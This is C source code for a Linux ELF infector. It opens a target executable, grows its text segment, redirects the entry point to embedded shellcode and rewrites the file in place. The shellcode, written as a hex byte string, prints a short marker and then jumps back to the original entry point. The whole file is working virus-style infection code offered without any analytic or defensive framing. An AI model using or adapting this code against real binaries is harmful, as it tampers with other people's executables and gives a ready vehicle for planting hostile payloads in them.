#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <linux/fcntl.h>
#include <errno.h>
#include <elf.h>
#include <asm/unistd.h>
#include <asm/stat.h>
#include <sys/mman.h>
#include "syscall_wrappers.h"
#define PAGE_SIZE 0x200000
char sc[]="\x50\x53\x51\x52\x57\x56\x41\x50\x41\x51\x41\x52\x48\x31\xc0\x48\x83\xec\x08\xc7\x04\x24\x4c\x53\x45\x0a\x48\x89\xe6\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc2\x04\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\x41\x5a\x41\x59\x41\x58\x5e\x5f\x5a\x59\x5b\x58"
"\xb8\x00\x00\x00\x00"
 	   "\xff\xe0";
__syscall1(int, close, int, fd);
__syscall1(int, unlink, const char *, pathname);
__syscall2(int, fstat, int, fd, struct stat *, buf);
__syscall3(int, open, const char *, path, int, flags, int, mode);
__syscall3(ssize_t, read, int, fd, void *, buf, size_t, len);
__syscall3(ssize_t, write, int, fd, const void *, buf, size_t, len);
__syscall3(off_t, lseek, int, fd, off_t, offset, int, whence);
__syscall6(void *, mmap, void *, addr, size_t, len, int, prot, int, flags, int,
	   fd, off_t, offset);

struct elf_handler
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	const char *target;
	char *mem;
	char *payload;
	size_t payload_sz;
	size_t host_sz;
	size_t entry;
};

int _strncmp(const char *s1, const char *s2, size_t n)
{
	while (n-- && (*s1 == *s2)) {
		s1++;
		s2++;
	}
	return *s1 - *s2;
}

struct elf_handler *init_handler(const char *target, struct elf_handler *h)
{
	int fd = sys_open(target, O_RDONLY, 0);
	struct stat buf;
	if (fd == -1)
		return NULL;
	if (sys_fstat(fd, &buf) < 0)
		return NULL;
	char *mem = sys_mmap(NULL, buf.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (mem == MAP_FAILED)
		return NULL;
	h->mem = mem;
	h->ehdr = (Elf64_Ehdr*)mem;
	h->phdr = (Elf64_Phdr*)(mem + h->ehdr->e_phoff);
	h->shdr = (Elf64_Shdr*)(mem + h->ehdr->e_shoff);
	h->entry = h->ehdr->e_entry;
	h->host_sz = buf.st_size;
	h->target = target;
	sys_close(fd);
	if (h->ehdr->e_ident[0] != 0x7f ||
	   _strncmp("ELF", &h->ehdr->e_ident[1], 3))
		return NULL;
	return h;
}

void inject_payload(struct elf_handler *h, size_t end_of_text, int jmp_offset)
{
	sys_unlink(h->target);
	int fd = sys_open(h->target, O_CREAT|O_WRONLY|O_TRUNC, 0755);
	sys_write(fd, h->mem, end_of_text);
	*(unsigned int *)&h->payload[jmp_offset] = h->entry;
	sys_write(fd, h->payload, h->payload_sz);
	off_t off = sys_lseek(fd, (PAGE_SIZE) - h->payload_sz, SEEK_CUR);
	h->mem += end_of_text;
	unsigned int rest = h->host_sz - end_of_text;
	sys_write(fd, h->mem, rest);
	sys_close(fd);
}

void text_pad_infect(struct elf_handler *h)
{
	Elf64_Phdr *phdr = h->phdr;
	Elf64_Shdr *shdr = h->shdr;
	size_t i = 0;
	size_t old_text_fsz, end_of_text;
	size_t payload_vaddr;
	for (; i < h->ehdr->e_phnum; ++i)
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0) {
			old_text_fsz = phdr[i].p_filesz;
			end_of_text = phdr[i].p_offset + phdr[i].p_filesz;
			payload_vaddr = phdr[i].p_vaddr + old_text_fsz;
			phdr[i].p_filesz += h->payload_sz;
			phdr[i].p_memsz += h->payload_sz;
			h->ehdr->e_entry = payload_vaddr;
			h->ehdr->e_shoff += PAGE_SIZE;
			size_t j;
			for (j = i + 1; j < h->ehdr->e_phnum; ++j) {
				if (phdr[j].p_offset > phdr[i].p_offset +
				    old_text_fsz)
					phdr[j].p_offset += PAGE_SIZE;
			}
			break;
		}
	for (i = 0; i < h->ehdr->e_shnum; ++i) {
		if (shdr[i].sh_offset >= end_of_text)
			shdr[i].sh_offset += PAGE_SIZE;
		else if(shdr[i].sh_addr + shdr[i].sh_size == payload_vaddr)
			shdr[i].sh_size += h->payload_sz;
	}
	inject_payload(h, end_of_text, sizeof(sc) - 7);
}

int main(int argc, char **argv)
{
	if (argc < 2)
		return 1;
	struct elf_handler h;
	h.payload = sc;
	h.payload_sz = sizeof(sc);
	init_handler(argv[1], &h);
	text_pad_infect(&h);
	return 0;
}

__asm__      (".global _start\n"
	      "_start:\n"
	      "movq (%rsp), %rdi\n"
	      "addq $8, %rsp\n"
	      "movq %rsp, %rsi\n"
	      "call main\n"
	      "mov %rax, %rdi\n"
	      "mov $60, %rax\n"
	      "syscall"
	     );
